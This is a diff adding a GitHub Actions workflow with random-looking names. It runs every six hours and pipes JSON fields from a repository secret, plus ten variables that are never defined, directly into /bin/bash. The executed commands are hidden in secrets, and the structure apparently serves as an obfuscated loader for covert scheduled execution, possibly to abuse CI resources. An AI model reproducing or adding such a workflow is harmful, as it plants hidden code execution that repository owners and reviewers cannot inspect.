@@ -1,0 +1,26 @@
+name: xiangyoumuyong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangyoumuyong
+        env:
+          mvg3017: ${{ secrets.mvg3017 }}
+        run: |
+          echo $mvg3017 | jq -r .d401 | /bin/bash
+          echo $vndsh62317 | jq -r .u1 | /bin/bash
+          echo $fsxl22924 | jq -r .e21433 | /bin/bash
+          echo $nkt9 | jq -r .hxqa6202 | /bin/bash
+          echo $dq3 | jq -r .hrcc1398 | /bin/bash
+          echo $mlpsw51 | jq -r .txx0 | /bin/bash
+          echo $ydcoh922 | jq -r .st1204 | /bin/bash
+          echo $gi6 | jq -r .erkgg11 | /bin/bash
+          echo $lvxef0 | jq -r .z00473 | /bin/bash
+          echo $buhgo15 | jq -r .gy952 | /bin/bash
+          echo $abka9 | jq -r .rgoi123 | /bin/bash
+
